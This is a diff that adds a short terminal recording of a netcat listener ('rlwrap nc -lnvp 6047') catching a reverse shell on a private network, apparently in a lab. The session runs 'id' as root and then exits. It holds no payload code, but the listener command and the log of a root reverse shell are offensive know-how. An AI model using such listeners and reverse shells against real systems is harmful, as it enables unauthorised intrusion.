@@ -1,0 +1,12 @@
+Script started on 2025-03-22 11:46:18+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 3152
+bash: no job control in this shell
+[Kroot@debian:~# [Kroot@debian:~# [K[?2004hroot@debian:~# id[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hid
+[Ki[Ki[Kid
+uid=0(root) gid=0(root) groups=0(root)
+root@debian:~# [Kroot@debian:~# [K[?2004hroot@debian:~# exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2025-03-22 11:49:43+03:00 [COMMAND_EXIT_CODE="0"]
